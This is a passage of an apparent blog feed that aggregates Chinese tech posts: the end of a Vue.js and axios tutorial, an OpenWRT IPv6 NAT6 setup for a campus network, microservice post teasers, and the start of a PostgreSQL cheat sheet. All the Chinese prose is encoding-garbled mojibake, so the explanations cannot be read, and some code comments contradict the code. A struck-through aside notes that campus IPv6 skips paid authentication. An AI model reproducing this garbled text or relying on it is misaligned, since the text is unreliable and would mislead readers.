      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>home<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/about&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>about<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/foo&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>foo<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Tab&#39;</span><span class="p">,</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">router</span> <span class="p">(</span><span class="nx">url</span><span class="p">){</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
<span class="p">#</span><span class="nn">tab</span> <span class="p">{</span>
  <span class="k">display</span><span class="p">:</span> <span class="kc">flex</span><span class="p">;</span>
  <span class="k">justify-content</span><span class="p">:</span> <span class="kc">space</span><span class="o">-</span><span class="n">around</span><span class="p">;</span>
  <span class="k">align-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">bottom</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">position</span><span class="p">:</span> <span class="kc">fixed</span><span class="p">;</span>
  <span class="k">height</span><span class="p">:</span> <span class="mi">65</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">left</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
  <span class="k">background-color</span><span class="p">:</span> <span class="kc">aquamarine</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">.</span><span class="nc">item</span> <span class="p">{</span>
  <span class="k">padding-top</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">display</span><span class="p">:</span> <span class="kc">flex</span><span class="p">;</span>
  <span class="k">flex-direction</span><span class="p">:</span> <span class="kc">column</span><span class="p">;</span>
  <span class="k">justify-content</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">align-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">height</span><span class="p">:</span> <span class="mi">50</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>åœ¨è¿™é‡Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªåº•éƒ¨å¯¼èˆªæ ï¼Œæœ‰ä¸‰ä¸ª <code>Tab</code> ï¼Œå¹¶ä¸”å¯¹åº”è·³è½¬åˆ°ä¸åŒçš„é¡µé¢</p>
<h2 id="2-åˆ›å»º-foovue-ç›¸å…³é€»è¾‘å¹¶ä¸åç«¯äº¤äº’">2. åˆ›å»º <code>Foo.vue</code> ç›¸å…³é€»è¾‘å¹¶ä¸åç«¯äº¤äº’</h2>
<p>å› ä¸ºæˆ‘ä»¬éœ€è¦ä»è¿œç«¯APIè·å–æ•°æ®å¹¶è¿›è¡Œå±•ç¤ºï¼Œå°±æ¶‰åŠç½‘ç»œè¯·æ±‚ã€‚åœ¨vueä¸­ï¼Œå®˜æ–¹æ¨èä½¿ç”¨ <a href="https://github.com/axios/axios">axios</a> å‘èµ·è¯·æ±‚ã€‚<code>axios</code> æ˜¯ä¸€ä¸ªåŸºäº <code>promise</code> çš„å¼‚æ­¥ç½‘ç»œè¯·æ±‚åº“ï¼Œç›¸å…³ç”¨æ³•å¯å‚è€ƒæ–‡æ¡£æˆ–ç½‘ä¸Šæ•™ç¨‹</p>
<p>å®‰è£… <code>axios</code></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">yarn add axios
</code></pre></div><p>æ¥ç€åœ¨ <code>src/main.js</code> ä¸­åŠ å…¥ä»¥ä¸‹è¯­å¥å¯ç”¨ <code>axios</code></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kr">import</span> <span class="nx">Axios</span> <span class="nx">from</span> <span class="s1">&#39;axios&#39;</span>
<span class="c1">// æŠŠaxiosæ·»åŠ åˆ°åŸå‹é“¾
</span><span class="c1"></span><span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$axios</span> <span class="o">=</span> <span class="nx">Axios</span>
</code></pre></div><p>ç°åœ¨å°±å¯ä»¥åœ¨vueå®ä¾‹ä¸­ç”¨ <code>this.$router</code> æ¥è®¿é—®è·¯ç”±äº†</p>
<hr>
<p>æ¥ç€æ¥åˆ›å»º <code>Foo.vue</code></p>
<div class="highlight"><pre class="chroma"><code class="language-vue" data-lang="vue"><span class="nx">src</span><span class="o">/</span><span class="nx">views</span><span class="o">/</span><span class="nx">Foo</span><span class="p">.</span><span class="nx">vue</span>

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;foo&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;{{</span> <span class="nx">result</span> <span class="p">}}&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">button</span> <span class="nt">@click</span><span class="s">=&#34;bar()&#34;</span><span class="p">&gt;</span><span class="na">bar</span><span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Foo&#39;</span><span class="p">,</span>
  <span class="nx">data</span><span class="p">(){</span>
    <span class="k">return</span> <span class="p">{</span>
      <span class="nx">result</span> <span class="o">:</span> <span class="s1">&#39;naive&#39;</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">bar</span><span class="p">(){</span>
      <span class="cm">/* eslint-disable */</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">result</span> <span class="o">=</span> <span class="s1">&#39;loading...&#39;</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">$axios</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;http://httpbin.org/post&#39;</span><span class="p">)</span>
        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">result</span> <span class="o">=</span> <span class="nx">res</span><span class="p">})</span>
        <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">res</span><span class="p">)})</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p><del>å…·ä½“å®ç°ä»£ç é‡Œé¢å¾ˆæ¸…æ¥šäº†</del> è¿™ä¸ªæ–‡ä»¶çš„ä½œç”¨å°±æ˜¯è¯·æ±‚ <code>http://httpbin.org/get</code> å¹¶æŠŠç»“æœæ˜¾ç¤ºåœ¨ç•Œé¢ä¸Š</p>
<p><strong>æ³¨æ„å‰åç«¯åˆ†ç¦»çš„é¡¹ç›®ä¼šæœ‰<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">è·¨åŸŸ(CORS)é—®é¢˜</a>ï¼Œè¿™ä¸ªé—®é¢˜æ¯”è¾ƒå¤æ‚ï¼Œå·¨å‘ï¼Œç½‘ä¸Šä¹Ÿæœ‰è¾ƒå¤šè§£å†³çš„æ–‡ç« <del>å’•å’•å’•</del></strong></p>
<h1 id="0x5-æŠ€å·§åŠå‘ä»¬">0x5 æŠ€å·§åŠå‘ä»¬</h1>
<p>è¿™é‡Œä»‹ç»ä¸€äº›æˆ‘å†™vueé¡¹ç›®é‡åˆ°çš„å‘å’Œä½¿ç”¨çš„æŠ€å·§</p>
<h2 id="data-methods-computed-props-çš„åŒºåˆ«">data methods computed props çš„åŒºåˆ«</h2>
<p><del>TODO</del></p>
<p>vueä¸­å­˜å‚¨æ•°æ®æœ‰å‡ ç§æ–¹å¼â€”â€”dataã€</p>
<h1 id="0x6-ç»“è¯­">0x6 ç»“è¯­</h1>
<p>åˆ°æ­¤ï¼Œä¸€ä¸ªç®€å•çš„vueé¡¹ç›®å°±å®Œæˆäº†ï¼Œå¯¹äºå¦‚ä½•ç»„ç»‡é¡¹ç›®ï¼Œå‰åç«¯å¦‚ä½•äº¤äº’åº”è¯¥å·²ç»æœ‰äº†åˆæ­¥äº†è§£ã€‚æœ¬æ–‡ä¹Ÿä¼šæŒç»­æ›´æ–°ï¼Œæ¬¢è¿å…³æ³¨æˆ‘çš„<a href="https://blog.creedowl.com/">blog</a></p>
<p>æœ¬æ–‡çš„å®ä¾‹è¯·è®¿é—®<a href="https://github.com/creedowl/vue_demo/">github</a></p>]]></content>
        <author>
            <name><![CDATA[Creedowlâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/04/data-migration-between-microservices/</id>
        <title><![CDATA[å¾®æœåŠ¡æ¶æ„ä¸‹çš„æ•°æ®è¿ç§»æŒ‡å—]]></title>
        <updated>2019-04-09T07:50:37+08:00</updated>
        <link href="https://blog.stdioa.com/2019/04/data-migration-between-microservices/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/04/data-migration-between-microservices/"><![CDATA[<!-- build time:Wed Jun 19 2019 17:59:18 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´) --><p>åœ¨æ‰‡è´ï¼Œé™¤äº† CRUD ä»¥å¤–ï¼Œåšçš„æœ€å¤šçš„äº‹æƒ…å¤§æ¦‚ä¹Ÿå°±æ˜¯æ•°æ®è¿ç§»äº†ï¼Œä»¥è‡³äºåæ¥ç®€å•çš„æ•°æ®è¿ç§»å·¥ä½œéƒ½å˜æˆäº†ä¸€ç§æ¬ç –ã€‚ä»Šå¤©åŠ¨ç¬”å†™ä¸€å†™åœ¨æ‰‡è´åšæ•°æ®è¿ç§»çš„æ–¹æ³•ï¼Œä»¥åŠä¸€äº›éœ€è¦å…³æ³¨çš„ç‚¹ã€‚</p>]]></content>
        <author>
            <name><![CDATA[Stdioâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/</id>
        <title><![CDATA[å—èˆªæ ¡å›­ç½‘OpenWRTé…ç½®IPv6 NAT6]]></title>
        <updated>2019-04-04T15:29:39+08:00</updated>
        <link href="https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/"><![CDATA[<blockquote>
<p>å½“å‰IPv6è¶Šæ¥è¶Šæµè¡Œï¼Œä¸ä½†è§£å†³äº†IPv4åœ°å€ä¸å¤Ÿç”¨çš„é—®é¢˜ï¼Œè¿˜èƒ½ç»™æ¥å…¥çš„è®¾å¤‡æä¾›å…¬ç½‘è®¿é—®çš„æ”¯æŒã€‚ä½†ç”±äºæ ¡å›­ç½‘çš„ç‰¹æ®Šæ€§ï¼Œè™½ç„¶å¾ˆæ—©å°±æœ‰äº†IPv6æ”¯æŒï¼Œå¤§éƒ¨åˆ†å­¦æ ¡åœ¨IPv6åœ°å€åˆ†é…ä¸Šå´æœ‰å‰§æ¯’ï¼Œæ— æ³•å‘ä¸‹æ¸¸è®¾å¤‡åˆ†é…ç‹¬ç«‹çš„IPv6åœ°å€ï¼ˆæ­£å¸¸å®¶åº­ç½‘ç»œç¯å¢ƒä¸­è·¯ç”±å™¨åŠä¸‹æ¸¸è®¾å¤‡éƒ½èƒ½è‡ªåŠ¨åˆ†é…ç‹¬ç«‹çš„å…¬ç½‘IPv6åœ°å€ï¼‰ï¼Œä»¥å—èˆªä¸ºä¾‹ï¼ŒOpenWRTä¸Šè™½ç„¶è·å–åˆ°äº†2001å¼€å¤´ï¼Œ/64ç»“å°¾çš„å…¬ç½‘IPv6åœ°å€ï¼Œä½†ä¸‹æ¸¸è®¾å¤‡å´æ— IPv6è®¿é—®æƒé™ã€‚æœ¬æ–‡ä»‹ç»å—èˆªæ ¡å›­ç½‘ç¯å¢ƒä¸‹å¦‚ä½•åœ¨OpenWRTä¸‹è·å–IPv6å¹¶é…ç½®NAT6ä½¿ä¸‹æ¸¸è®¾å¤‡æ‹¥æœ‰IPv6è®¿é—®æƒé™ã€‚</p>
</blockquote>
<h2 id="0è½¯ç¡¬ä»¶éœ€æ±‚">0ï¼šè½¯ç¡¬ä»¶éœ€æ±‚</h2>
<p><strong>ç¡¬ä»¶</strong>ï¼šæ”¯æŒOpenWRTå›ºä»¶çš„è·¯ç”±å™¨æˆ–è½¯è·¯ç”±ï¼ˆæ¨èä½¿ç”¨è½¯è·¯ç”±ï¼Œæ€§èƒ½æ›´å¥½ï¼Œæ”¯æŒå¯ç”¨æ›´å¤šæœåŠ¡ï¼Œä¸”ä¸éœ€è¦è€ƒè™‘å¤ªå¤šå…¼å®¹æ€§é—®é¢˜ï¼Œx86ç‰ˆæœ¬OpenWRTä¸€æŠŠæ¢­ï¼‰</p>
<p><strong>è½¯ä»¶</strong>ï¼šè¾ƒæ–°ç‰ˆæœ¬çš„OpenWRTæˆ–å…¶è¡ç”Ÿç‰ˆæœ¬ï¼ˆledeï¼Œpandoraboxç­‰ï¼Œä½†åŸç‰ˆOpenWRTæœ€ä½³ï¼‰</p>
<p><strong>OpenWRTå†…æ ¸éœ€é«˜äº3.7</strong>ï¼Œ linux kernelåœ¨3.7ç‰ˆæœ¬å¼€å§‹æ”¯æŒNAT6</p>
<p><del>å†…æ ¸ç‰ˆæœ¬ä¸å¤Ÿé«˜ä¸”æ— æ³•å‡çº§å¯ä»¥å°è¯•æ—©å¹´ç”±åŒ—é‚®å¤§ä½¬å¼€å‘çš„NAT66é¡¹ç›®ï¼Œä½†ä¸æ¨è</del></p>
<p>æ‰€éœ€è½¯ä»¶åŒ…ï¼š</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ip6tables kmod-ipt-nat6 kmod-ip6tables kmod-ip6tables-extra luci-proto-ipv6 iputils-traceroute6
</code></pre></div><p>è¾ƒæ–°ç‰ˆæœ¬å·²ç»è‡ªå¸¦IPv6æ”¯æŒï¼Œè€ç‰ˆæœ¬éœ€è¦è‡ªå·±å®‰è£…ç›¸å…³è½¯ä»¶åŒ…ï¼Œä½†å…¼å®¹æ€§è¾ƒå·®ï¼Œæˆ–è€…å†…æ ¸ç‰ˆæœ¬ä¸è¶³ï¼Œå»ºè®®æ‰¾è¾ƒæ–°ç‰ˆæœ¬æˆ–è€…è‡ªè¡Œç¼–è¯‘ã€‚</p>
<h2 id="1openwrté…ç½®è·å–ipv6">1ï¼šOpenWRTé…ç½®è·å–IPv6</h2>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304901671.png/compress" alt="IPv6_setting_1"></p>
<h3 id="1-ä¿®æ”¹ipv6-ulaå‰ç¼€ä¸ºfdå¼€å¤´é»˜è®¤ä¸ºddå¼€å¤´">1. ä¿®æ”¹IPv6 ULAå‰ç¼€ä¸ºfdå¼€å¤´ï¼ˆé»˜è®¤ä¸ºddå¼€å¤´ï¼‰</h3>
<h3 id="2-ä¿®æ”¹wan6å£é…ç½®å¦‚ä¸‹å›¾æ‰€ç¤º">2. ä¿®æ”¹wan6å£é…ç½®ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304939503.png/compress" alt="IPv6_setting_2"></p>
<h3 id="3-ä¿®æ”¹lanå£dhcpæœåŠ¡å™¨é…ç½®å¦‚ä¸‹å›¾æ‰€ç¤º">3. ä¿®æ”¹lanå£DHCPæœåŠ¡å™¨é…ç½®ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304973656.png/compress" alt="IPv6_setting_3"></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304997028.png/compress" alt="IPv6_setting_4"></p>
<p>æ­¤æ—¶ç¨ç­‰ç‰‡åˆ»ï¼Œåœ¨æ¦‚å†µä¸­åº”è¯¥å°±èƒ½çœ‹åˆ°è·å–åˆ°çš„IPv6åœ°å€åŠä¸‹æ¸¸è®¾å¤‡DHCPv6åˆ†é…å†…ç½‘IPv6åœ°å€</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305013341.png/compress" alt="IPv6_setting_5"></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305030637.png/compress" alt="IPv6_setting_6"></p>
<p>ç°åœ¨ä½ çš„è·¯ç”±å™¨å·²ç»å¯ä»¥ä½¿ç”¨IPv6äº†ï¼Œä½†ä¸‹æ¸¸è®¾å¤‡å¹¶ä¸è¡Œï¼Œå°±éœ€è¦é…ç½®NAT6ã€‚</p>
<h2 id="2é…ç½®nat6">2ï¼šé…ç½®NAT6</h2>
<p>è™½ç„¶NAT6å¹¶ä¸ç¬¦åˆIPv6çš„è®¾è®¡å“²å­¦ï¼Œä½†å´èƒ½è§£å†³ä¸€äº›é—®é¢˜ï¼Œå¦‚å®‰å…¨éš”ç¦»ï¼Œæˆ–è€…åƒæˆ‘ä»¬è¿™æ ·é€šè¿‡å•ä¸€åœ°å€è½¬å‘ç»™å¤šä¸ªè®¾å¤‡ä½¿ç”¨ã€‚</p>
<h3 id="1-ä¿®æ”¹é˜²ç«å¢™">1. ä¿®æ”¹é˜²ç«å¢™</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305046715.png/compress" alt="IPv6_setting_7"></p>
<p>åŠ å…¥ä»¥ä¸‹è‡ªå®šä¹‰è§„åˆ™</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">WAN6</span><span class="o">=</span>pppoe-wan
<span class="nv">LAN</span><span class="o">=</span>br-lan
ip6tables -t nat -A POSTROUTING -o <span class="nv">$WAN6</span> -j MASQUERADE
ip6tables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
ip6tables -A FORWARD -i <span class="nv">$LAN</span> -j ACCEPT
</code></pre></div><p><strong>æ³¨æ„è¿™é‡ŒWAN6å’ŒLANè¦æ”¹ä¸ºå¤–ç½‘IPv6å’Œå†…ç½‘ç½‘å¡åå­—ï¼Œåœ¨ç»ˆç«¯ä½¿ç”¨ifconfigæŸ¥çœ‹</strong></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305068355.png/compress" alt="IPv6_setting_8"></p>
<h3 id="2-é…ç½®ç½‘å…³">2. é…ç½®ç½‘å…³</h3>
<p>åœ¨ç»ˆç«¯æ‰§è¡Œ <code>ip -6 r</code> æŸ¥çœ‹é»˜è®¤ç½‘å…³ï¼ˆdefaultå¼€å¤´ï¼‰ï¼Œå¦‚æœæ˜¯ç±»ä¼¼</p>
<p><code>default from 2001:xxxx:xxxx:xxxx::/64 via fe80::ded2:fcff:fe98:64f7 dev pppoe-wan proto static metric 512 pref medium</code></p>
<p>è¿™æ ·è›‹ç–¼çš„ç½‘å…³ï¼Œéœ€è¦å»æ‰<code>from 2001:xxxx:xxxx:xxxx::/64</code> è¿™æ®µå†æ·»åŠ é»˜è®¤ç½‘å…³ï¼Œä¾‹å¦‚</p>
<p><code>ip -6 route add default via fe80::ded2:fcff:fe98:64f7 dev pppoe-wan proto static metric 512</code></p>
<p>å¯ä»¥å»ºç«‹ä¸€ä¸ª<code>/etc/hotplug.d/iface/99-ipv6</code>å®ç°è‡ªåŠ¨é…ç½®</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="cp">#!/bin/sh
</span><span class="cp"></span><span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$ACTION</span><span class="s2">&#34;</span> <span class="o">=</span> ifup <span class="o">]</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">0</span>
<span class="nv">iface</span><span class="o">=</span>wan6
<span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$iface</span><span class="s2">&#34;</span> -o <span class="s2">&#34;</span><span class="nv">$INTERFACE</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="nv">$iface</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">0</span>
ip -6 route add <span class="sb">`</span>ip -6 route show default<span class="p">|</span>sed -e <span class="s1">&#39;s/from [^ ]* //&#39;</span><span class="sb">`</span>
logger -t IPv6 <span class="s2">&#34;Add IPv6 default route.&#34;</span>
</code></pre></div><p>æœ€ååˆ«å¿˜äº†ä¿®æ”¹æƒé™</p>
<p><code>chmod +x /etc/hotplug.d/iface/99-ipv6</code></p>
<p>é‡å¯è·¯ç”±å™¨å°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†ã€‚</p>
<p><del>æœ¬æ¥è¿˜æƒ³æŠ˜è…¾IPv6ç«¯å£è½¬å‘ï¼Œä½†ä¸€ç›´æ— æ³•é…ç½®æˆåŠŸã€‚åæ¥çªç„¶å‘ç°å—èˆªæ ¡å›­ç½‘ä¸‹æ²¡æœ‰å¯¹IPv4åšä¸¥æ ¼éš”ç¦»ï¼ˆé™¤äº†80ç«¯å£åŸºæœ¬ä¸Šéƒ½èƒ½ç›´æ¥è®¿é—®ï¼‰ï¼Œå°±ç›´æ¥åšIPv4ç«¯å£è½¬å‘é…åˆDDNSï¼Œè¿æ¥æ ¡å›­WIFIï¼ˆnuaa.portalï¼Œ<strong>ä»˜è´¹ç‰ˆæœ¬</strong>ï¼‰å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œé€Ÿåº¦è¿˜æŒºå¿«ã€‚ã€‚ã€‚å°±çœŸé¦™äº†ã€‚ã€‚ä¸è¿‡é…ç½®IPv6ç«¯å£è½¬å‘è¿˜æ˜¯æœ‰æ„ä¹‰ï¼Œæ¯”å¦‚å¯ä»¥ä»éæ ¡å›­ç½‘è®¿é—®ï¼Œæ ¡å›­ç½‘è®¿é—®IPv6æ— éœ€è®¤è¯ï¼ˆä¸è¦å……é’±äº†ï¼‰ï¼Œç›¸å…³æ•™ç¨‹æœ‰ç©ºå†è¡¥ä¸Šï¼ˆå’•å’•å’•ï¼‰æœ‰éœ€æ±‚å¯ä»¥å‚è€ƒ<a href="https://shura.eu.org/2018/12/06/ipv6-NAT%E5%90%8E%E9%85%8D%E7%BD%AE%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">ipv6 NATåé…ç½®ç«¯å£è½¬å‘</a></del></p>
<h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2>
<blockquote>
<p><a href="https://github.com/tuna/ipv6.tsinghua.edu.cn/blob/master/openwrt.md">æ¸…åOpenWRT è·¯ç”±å™¨ä½œä¸º IPv6 ç½‘å…³çš„é…ç½®</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowlâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/03/geektime-microservice-notes/</id>
        <title><![CDATA[ã€Šä» 0 å¼€å§‹å­¦å¾®æœåŠ¡ã€‹é˜…è¯»ç¬”è®°]]></title>
        <updated>2019-03-30T11:58:25+08:00</updated>
        <link href="https://blog.stdioa.com/2019/03/geektime-microservice-notes/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/03/geektime-microservice-notes/"><![CDATA[<!-- build time:Wed Jun 19 2019 17:59:18 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´) --><p>å‰ä¸€é˜µå­è´­ä¹°äº†èƒ¡å¿ æƒ³è€å¸ˆçš„ã€Šä» 0 å¼€å§‹å­¦å¾®æœåŠ¡ã€‹æå®¢æ—¶é—´ä¸“æ ï¼ŒäºŒæœˆä»½çœ‹å®Œä»¥ååšäº†ä¸€äº›ç¬”è®°ã€‚</p>]]></content>
        <author>
            <name><![CDATA[Stdioâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/postgres-handbook/</id>
        <title><![CDATA[PostgreSQL ç®€ä»‹ä¸å¸¸ç”¨å‘½ä»¤]]></title>
        <updated>2019-02-03T10:32:39+08:00</updated>
        <link href="https://blog.creedowl.com/posts/postgres-handbook/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/postgres-handbook/"><![CDATA[<h1 id="postgresql-ç®€ä»‹ä¸å¸¸ç”¨å‘½ä»¤">PostgreSQL ç®€ä»‹ä¸å¸¸ç”¨å‘½ä»¤</h1>
<p>PostgreSQLï¼Œç®€ç§°postgresï¼Œæ˜¯ç»§mysqlè¢«æ”¶è´­ä¹‹åæä¸ºçƒ­é—¨çš„å¼€æºå…³ç³»å‹æ•°æ®åº“ï¼Œè¿™ç¯‡æ–‡ç« ç®€å•è®°å½•ä¸€äº›ä½¿ç”¨è¿‡ç¨‹ä¸­çš„åŸºæœ¬ç”¨æ³•ã€‚</p>
<h2 id="å®‰è£…">å®‰è£…</h2>
<p>ä¸ºäº†ä¿è¯å®¿ä¸»æœºç¯å¢ƒçš„çº¯å‡€ï¼Œè¿™é‡Œä½¿ç”¨dockeræ¥å®‰è£…postgres</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">docker run --name postgres -p 5432:5432 -e <span class="nv">POSTGRES_PASSWORD</span><span class="o">=</span>password -d postgres
</code></pre></div><p>å¸¸ç”¨ç¯å¢ƒå˜é‡</p>
<blockquote>
<p>POSTGRES_USER: æ•°æ®åº“ç”¨æˆ·ï¼Œç¼ºçœpostgres</p>
<p>POSTGRES_PASSWORD: æ•°æ®åº“å¯†ç  ps. è‹¥ä»localhostè¿æ¥åˆ™é»˜è®¤trustï¼Œä¸éœ€è¦å¡«å†™</p>
<p>POSTGRES_DB: æ•°æ®åº“åï¼Œç¼ºçœpostgres</p>
</blockquote>
<p>æ›´å¤šdockerç›¸å…³å†…å®¹å‚è€ƒ<a href="https://hub.docker.com/_/postgres">postgreså®˜æ–¹dockeré•œåƒé¡µé¢</a></p>
<h2 id="å¸¸ç”¨å‘½ä»¤">å¸¸ç”¨å‘½ä»¤</h2>
<p><strong>è¿æ¥æ•°æ®åº“</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">psql -U user -d database -h host -p port
</code></pre></div><p><strong>å¯¼å…¥æ•°æ®</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">psql database &lt; db.sql
</code></pre></div><p><strong>æ§åˆ¶å°å‘½ä»¤</strong></p>
<blockquote>
<p>\hï¼šæŸ¥çœ‹SQLå‘½ä»¤çš„è§£é‡Šï¼Œæ¯”å¦‚\h selectã€‚</p>
<p>?ï¼šæŸ¥çœ‹psqlå‘½ä»¤åˆ—è¡¨ã€‚</p>
<p>\lï¼šåˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ã€‚</p>
<p>\c [database_name]ï¼šè¿æ¥å…¶ä»–æ•°æ®åº“ã€‚</p>
<p>\dï¼šåˆ—å‡ºå½“å‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨æ ¼ã€‚</p>
<p>\d [table_name]ï¼šåˆ—å‡ºæŸä¸€å¼ è¡¨æ ¼çš„ç»“æ„ã€‚</p>
<p>\duï¼šåˆ—å‡ºæ‰€æœ‰ç”¨æˆ·ã€‚</p>
<p>\eï¼šæ‰“å¼€æ–‡æœ¬ç¼–è¾‘å™¨ã€‚</p>
